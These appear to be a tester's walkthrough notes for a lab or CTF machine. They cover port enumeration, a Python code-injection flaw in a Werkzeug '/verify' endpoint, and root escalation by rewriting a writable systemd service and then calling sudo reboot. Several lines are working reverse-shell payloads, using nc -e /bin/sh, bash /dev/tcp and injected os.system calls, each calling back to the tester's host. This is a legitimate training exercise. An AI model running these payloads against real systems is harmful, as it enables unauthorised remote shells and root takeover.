nmap shows ports 21 ftp, 22 ssh, 80 web, 139, 445 smb, 18000 protombo, 50000 werkzeug

ftp, smb locked down, nothing helpful on werkzeug (page just showed {'/generate', '/verify'})

port 18000-
protombo page to signup or login
needs an invite code to register a new user, and nothing seemed vuln to sqli

HINT TAKEN : port 19000 has /verify and /generate endpoints, verify can be used for python command injection.
revisiting port 18000 - 
```zsh
└─$ curl http://192.168.233.117:50000
{'/generate', '/verify'} 

└─$ curl http://192.168.233.117:50000/generate
{'email@domain'}

└─$ curl http://192.168.233.117:50000/generate -d "email@domain"
<title>400 Bad Request</title>

└─$ curl http://192.168.233.117:50000/generate -d "email=email@domain"
a0f42a1eae5f387a50966ac4b183270eae6832d2823ca5ea9f4685fa248fdf7d

└─$ curl http://192.168.233.117:50000/verify               
{'code'} 

└─$ curl http://192.168.233.117:50000/verify -d "a1503ade1f49527e5a6242a898128a5c05f9441083cb3f896e167672e5bafa53"
<title>400 Bad Request</title>

└─$ curl http://192.168.233.117:50000/verify -d "code=a1503ade1f49527e5a6242a898128a5c05f9441083cb3f896e167672e5bafa53"
<title>500 Internal Server Error</title>

└─$ curl http://192.168.233.117:50000/verify -d "code=2*2"
4 

└─$ curl http://192.168.233.117:50000/verify -d "code=os.system('wget 192.168.45.249/test')"
2048
#gave us a hit on our python server. so, lets get a shell

curl http://192.168.233.117:50000/verify -d "code=os.system('nc -nv 192.168.45.249 22 -e /bin/sh')"

#Note - for when we find ourseleves in a sitch where os is not imported 
-d "code=__import__('os').system('bash -c \\"bash -i >& /dev/tcp/192.168.45.168/21 0>&1\\"')"
```

crontab has SUID set on it
 sudo -l shows /sbin/halt, /sbin/shutdown, /sbin/reboot

This should hopefully mean we can restart services. for that to work, we need writable services
`find /etc/systemd/system/ -writable -type f 2>/dev/null`
shows we can write to the service, `/etc/systemd/system/pythonapp.service`

```zsh
cat /etc/systemd/system/pythonapp.service
#copy the text
echo " #ctrl+shift+v" > /dev/shm/tmp.svc
#before hitting enter, 
#modify user=root
#modify ExecStart=nc 192.168.45.200 80 -e /bin/sh
cat /dev/shm/tmp.svc > /etc/systemd/system/pythonapp.service

sudo -l
#as shown earlier, /sbin/reboot is enabled for us
#listen on port 80
sudo /sbin/reboot
```
root!